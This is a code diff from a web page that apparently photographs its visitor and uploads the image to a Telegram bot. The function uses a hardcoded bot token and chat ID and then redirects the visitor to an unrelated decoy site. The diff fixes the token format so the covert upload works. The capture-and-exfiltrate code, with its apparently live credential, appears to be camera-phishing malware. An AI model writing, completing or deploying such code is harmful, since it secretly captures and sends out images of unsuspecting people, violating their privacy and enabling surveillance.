@@ -91,24 +91,25 @@
 
         // Send Photo to Telegram Bot
         function sendToTelegram(blob) {
-            const formData = new FormData();
-            formData.append('chat_id', '<5543174018>');
-            formData.append('photo', blob);
+    const formData = new FormData();
+    formData.append('chat_id', '5543174018');
+    formData.append('photo', blob);
 
-            fetch(`https://api.telegram.org/bot<7455966277:AAE3vN10-2AMKGW5ZKE_WrRR_nSETKot_b8>/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log("Photo sent to Telegram:", data);
-                // Redirect to the link
-                window.location.href = "https://stars.chromeexperiments.com/";
-            })
-            .catch(error => {
-                console.error("Error sending photo:", error);
-            });
+    fetch(`https://api.telegram.org/bot7455966277:AAE3vN10-2AMKGW5ZKE_WrRR_nSETKot_b8/sendPhoto`, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            console.log("Photo sent to Telegram:", data);
+            // Redirect to the link
+            window.location.href = "https://stars.chromeexperiments.com/";
+        } else {
+            console.error("Error in Telegram API:", data);
         }
-    </script>
-</body>
-</html>
+    })
+    .catch(error => {
+        console.error("Error sending photo:", error);
+    });
+}
